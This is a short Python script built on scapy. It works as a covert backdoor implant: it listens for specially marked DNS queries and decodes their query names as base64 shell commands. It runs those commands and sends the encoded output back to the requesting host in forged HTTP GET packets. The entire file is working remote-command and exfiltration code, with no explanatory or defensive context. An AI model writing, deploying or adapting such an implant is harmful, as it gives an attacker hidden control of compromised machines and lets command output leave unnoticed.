#!/usr/bin/python

import subprocess, time, base64
from scapy.all import *

def do_this(inpkt):
	eve = inpkt[IP].src
	cmd = (((inpkt[DNSQR].qname).replace('.com','==')).replace('.net','=')).replace('.org','')
	cmd = base64.b64decode(cmd)
	cmdout = base64.b64encode(subprocess.check_output(cmd))
	getStr = "GET /index.php?ac=" + cmdout  + " HTTP/1.1\r\nHost: " + eve + "\r\n\r\n"
	outpkt = IP(dst=eve)/TCP(dport=80, sport=31700,flags='A')/getStr
	time.sleep(3)
	send(outpkt)

while True:
	pkt = sniff(count=1, prn=do_this, lfilter=lambda x: x.haslayer(DNSQR) and x[DNS].id >= 0xff00)



